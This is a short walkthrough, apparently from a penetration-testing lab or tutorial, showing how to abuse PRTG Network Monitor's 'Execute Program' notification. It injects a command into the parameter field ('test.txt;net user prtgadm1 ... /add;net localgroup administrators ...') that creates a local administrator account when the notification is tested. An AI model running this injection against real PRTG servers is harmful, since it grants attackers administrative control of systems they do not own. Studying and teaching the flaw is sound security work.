To begin, mouse over `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`.
Next, click on `Add new notification`.
Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`. 
Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down.
Finally, in the parameter field, enter a command. 
For our purposes, we will add a new local admin user by entering `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`.
After clicking `Save`, we will be redirected to the `Notifications` page and see our new notification named `pwn` in the list.
At this point, all that is left is to click the `Test` button to run our notification and execute the command to add a local admin user.
